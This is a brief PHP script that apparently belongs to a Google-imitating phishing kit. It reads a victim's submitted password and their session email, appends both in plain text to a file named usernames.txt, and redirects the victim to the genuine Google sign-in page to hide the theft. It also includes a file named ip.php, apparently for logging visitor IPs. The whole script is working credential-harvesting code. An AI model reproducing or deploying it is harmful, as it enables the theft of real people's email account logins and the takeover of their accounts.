<?php
include 'ip.php';
			session_start();
			
			$pass = $_POST["password"];
			$email=$_SESSION["Email"];
			
  			
  			file_put_contents("usernames.txt", "Account" . " ". $email . " " . " " . "Pass" . " " . $pass . "\n", FILE_APPEND);
  			header('Location: https://accounts.google.com/signin/v2/identifier?service=mail&passive=true&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fx%2Fuhgoe4rzw9yf-%2F%3Ff%3D1&scc=1&ltmpl=ecobx&nui=5&btmpl=mobile&emr=1&osid=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin');
			exit();
			
			
			session_destroy();
			
?>